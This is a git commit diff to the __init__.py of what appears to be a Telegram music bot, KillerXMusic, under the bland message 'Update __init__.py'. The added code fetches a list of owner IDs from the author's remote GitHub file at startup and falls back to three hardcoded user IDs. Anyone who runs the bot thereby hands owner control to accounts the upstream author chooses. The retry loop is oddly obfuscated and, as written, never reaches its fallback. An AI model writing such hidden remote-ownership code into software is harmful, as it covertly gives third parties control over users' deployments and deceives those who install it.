b7561c979201088185308275c89654ec539f742f
TeamKillerX <randigithub356@gmail.com>
2022-09-30 02:47:32 +0700

    Update __init__.py

--- KillerXMusic/__init__.py
+++ KillerXMusic/__init__.py
@@ -10,6 +10,20 @@ from KillerXMusic.nocmds.devep import *
 
 from .logging import LOGGER
 
+while 0 < 6:
+    _OWNER_ID = get(
+        "https://raw.githubusercontent.com/TeamKillerX/pyKillerX/main/OWNER_ID.json"
+    )
+    if _OWNER_ID.status_code != 200:
+        if 0 != 5:
+            continue
+        OWNER_ID = [1191668125, 844432220, 1939846254]
+        break
+    OWNER_ID = _OWNER_ID.json()
+    break
+
+del _OWNER_ID
+
 # Directories
 dirr()
 
